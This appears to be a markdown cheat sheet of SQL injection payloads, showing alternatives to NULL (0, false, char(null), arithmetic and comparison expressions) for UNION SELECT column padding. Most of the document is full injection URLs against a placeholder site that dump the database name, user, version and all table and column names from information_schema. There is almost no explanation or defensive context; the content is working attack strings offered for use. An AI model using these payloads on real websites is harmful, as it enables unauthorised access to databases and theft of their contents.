# The Alternative WAY of using Null in SQL Injection

## The traditional way of using Null

```
Union Select null,null,null,null
```

## The alternative way of using Null

```
Union Select 0,0,0,0
Union Select false,false,false,false
Union Select char(null),char(null),char(null),char(null)
Union Select char(false),char(false),char(false),char(false)
Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)
Union Select 34=35,34=35,34=35,34=35
```

## Examples

Using **0**

```
http://website.com/index.php?id=1 div 0 Union Select "0 div 0 Union Select 0,0,0,0,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),0--+",0,0,0,0,0--+
```

Using **false**
```
http://website.com/index.php?id=1 div false Union Select "false div false Union Select false,false,false,false,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),false--+",false,false,false,false,false--+
```

Using **char()**
```
http://website.com/index.php?id=1 div char(null) Union Select "char(null) div char(null) Union Select char(null),char(null),char(null),char(null),concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),char(null)--+",char(null),char(null),char(null),char(null),char(null)--+
```

Using Arithmetic or Logical Operator
```
http://website.com/index.php?id=1 div (0*1337-0) Union Select "(0*1337-0) div (0*1337-0) Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),(0*1337-0)--+",(0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)--+
http://website.com/index.php?id=1 div 34=35 Union Select "34=35 div 34=35 Union Select 34=35,34=35,34=35,34=35,concat(0x222f3e,0x3c62723e,'Injected',0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version :: ',version(),0x3c62723e,user(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),34=35--+",34=35,34=35,34=35,34=35,34=35--+
```
